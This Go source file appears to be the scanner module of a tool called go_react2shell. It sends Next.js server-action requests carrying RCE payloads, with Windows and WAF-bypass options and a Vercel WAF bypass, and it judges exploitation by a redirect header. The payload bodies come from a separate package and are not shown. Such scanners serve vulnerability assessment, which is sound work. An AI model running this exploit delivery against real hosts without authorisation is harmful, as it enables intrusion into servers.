package scanner

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"go_react2shell/internal/config"
	"go_react2shell/internal/payload"
)

// Result represents the scan result for a single host
type Result struct {
	Host       string    `json:"host"`
	Vulnerable *bool     `json:"vulnerable"`
	StatusCode *int      `json:"status_code,omitempty"`
	Error      string    `json:"error,omitempty"`
	Request    string    `json:"request,omitempty"`
	Response   string    `json:"response,omitempty"`
	FinalURL   string    `json:"final_url,omitempty"`
	TestedURL  string    `json:"tested_url,omitempty"`
	Timestamp  time.Time `json:"timestamp"`
}

// Scanner performs vulnerability checks
type Scanner struct {
	config *config.Config
	client *http.Client
}

// New creates a new Scanner instance
func New(cfg *config.Config) *Scanner {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !cfg.VerifySSL,
		},
		DisableKeepAlives: true,
	}

	client := &http.Client{
		Timeout:   cfg.Timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &Scanner{
		config: cfg,
		client: client,
	}
}

// Check performs vulnerability check on a single host
func (s *Scanner) Check(host string) Result {
	result := Result{
		Host:      host,
		Timestamp: time.Now().UTC(),
	}

	host = normalizeHost(host)
	if host == "" {
		result.Error = "Invalid or empty host"
		return result
	}

	paths := s.config.Paths
	if len(paths) == 0 {
		paths = []string{"/"}
	}

	var body, contentType string
	var isVulnerable func(*http.Response, string) bool

	if s.config.SafeCheck {
		body, contentType = payload.BuildSafePayload()
		isVulnerable = isVulnerableSafeCheck
	} else if s.config.VercelWAFBypass {
		body, contentType = payload.BuildVercelWAFBypassPayload()
		isVulnerable = isVulnerableRCECheck
	} else {
		body, contentType = payload.BuildRCEPayload(
			s.config.Windows,
			s.config.WAFBypass,
			s.config.WAFBypassSizeKB,
		)
		isVulnerable = isVulnerableRCECheck
	}

	headers := s.buildHeaders(contentType)

	for idx, path := range paths {
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}

		testURL := host + path
		result.TestedURL = testURL
		result.FinalURL = testURL
		result.Request = buildRequestString(testURL, headers, body)

		resp, respBody, err := s.sendPayload(testURL, headers, body)
		if err != nil {
			if !s.config.SafeCheck && err.Error() == "request timed out" {
				result.Vulnerable = boolPtr(false)
				result.Error = err.Error()
				if idx < len(paths)-1 {
					continue
				}
				return result
			}
			if idx < len(paths)-1 {
				continue
			}
			result.Error = err.Error()
			return result
		}

		result.StatusCode = intPtr(resp.StatusCode)
		result.Response = buildResponseString(resp, respBody)

		if isVulnerable(resp, respBody) {
			result.Vulnerable = boolPtr(true)
			return result
		}

		// Try to redirect a path if enabled
		if s.config.FollowRedirects {
			redirectURL := s.resolveRedirects(testURL)
			if redirectURL != testURL {
				resp, respBody, err = s.sendPayload(redirectURL, headers, body)
				if err == nil {
					result.FinalURL = redirectURL
					result.Request = buildRequestString(redirectURL, headers, body)
					result.StatusCode = intPtr(resp.StatusCode)
					result.Response = buildResponseString(resp, respBody)

					if isVulnerable(resp, respBody) {
						result.Vulnerable = boolPtr(true)
						return result
					}
				}
			}
		}
	}

	result.Vulnerable = boolPtr(false)
	return result
}

func (s *Scanner) buildHeaders(contentType string) map[string]string {
	headers := map[string]string{
		"User-Agent":               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
		"Next-Action":              "x",
		"X-Nextjs-Request-Id":      "b5dce965",
		"Content-Type":             contentType,
		"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
	}

	for k, v := range s.config.CustomHeaders {
		headers[k] = v
	}

	return headers
}

func (s *Scanner) sendPayload(targetURL string, headers map[string]string, body string) (*http.Response, string, error) {
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
	if err != nil {
		return nil, "", fmt.Errorf("failed to create request: %w", err)
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") ||
			strings.Contains(err.Error(), "timeout") {
			return nil, "", fmt.Errorf("request timed out")
		}
		return nil, "", err
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return resp, "", nil
	}

	return resp, string(respBody), nil
}

func (s *Scanner) resolveRedirects(targetURL string) string {
	currentURL := targetURL
	originalHost := ""
	if parsed, err := url.Parse(targetURL); err == nil {
		originalHost = parsed.Host
	}

	for i := 0; i < 10; i++ {
		req, err := http.NewRequest("HEAD", currentURL, nil)
		if err != nil {
			break
		}

		resp, err := s.client.Do(req)
		if err != nil {
			break
		}
		_ = resp.Body.Close()

		if resp.StatusCode < 300 || resp.StatusCode >= 400 {
			break
		}

		location := resp.Header.Get("Location")
		if location == "" {
			break
		}

		if strings.HasPrefix(location, "/") {
			parsed, _ := url.Parse(currentURL)
			currentURL = fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, location)
		} else {
			newParsed, err := url.Parse(location)
			if err != nil || newParsed.Host != originalHost {
				break
			}
			currentURL = location
		}
	}

	return currentURL
}

func isVulnerableSafeCheck(resp *http.Response, body string) bool {
	if resp.StatusCode != 500 || !strings.Contains(body, `E{"digest"`) {
		return false
	}

	server := strings.ToLower(resp.Header.Get("Server"))
	hasNetlifyVary := resp.Header.Get("Netlify-Vary") != ""

	isMitigated := hasNetlifyVary || server == "netlify" || server == "vercel"
	return !isMitigated
}

func isVulnerableRCECheck(resp *http.Response, _ string) bool {
	redirectHeader := resp.Header.Get("X-Action-Redirect")
	matched, _ := regexp.MatchString(`.*/login\?a=11111.*`, redirectHeader)
	return matched
}

func normalizeHost(host string) string {
	host = strings.TrimSpace(host)
	if host == "" {
		return ""
	}
	if !strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
		host = "https://" + host
	}
	return strings.TrimRight(host, "/")
}

func buildRequestString(targetURL string, headers map[string]string, body string) string {
	parsed, _ := url.Parse(targetURL)
	path := parsed.Path
	if path == "" {
		path = "/"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("POST %s HTTP/1.1\r\n", path))
	sb.WriteString(fmt.Sprintf("Host: %s\r\n", parsed.Host))
	for k, v := range headers {
		sb.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
	}
	sb.WriteString(fmt.Sprintf("Content-Length: %d\r\n\r\n", len(body)))

	if len(body) > 500 {
		sb.WriteString(body[:500])
		sb.WriteString("...[truncated]")
	} else {
		sb.WriteString(body)
	}

	return sb.String()
}

func buildResponseString(resp *http.Response, body string) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("HTTP/1.1 %d %s\r\n", resp.StatusCode, http.StatusText(resp.StatusCode)))
	for k, v := range resp.Header {
		sb.WriteString(fmt.Sprintf("%s: %s\r\n", k, strings.Join(v, ", ")))
	}
	sb.WriteString("\r\n")

	if len(body) > 2000 {
		sb.WriteString(body[:2000])
	} else {
		sb.WriteString(body)
	}

	return sb.String()
}

func boolPtr(b bool) *bool {
	return &b
}

func intPtr(i int) *int {
	return &i
}
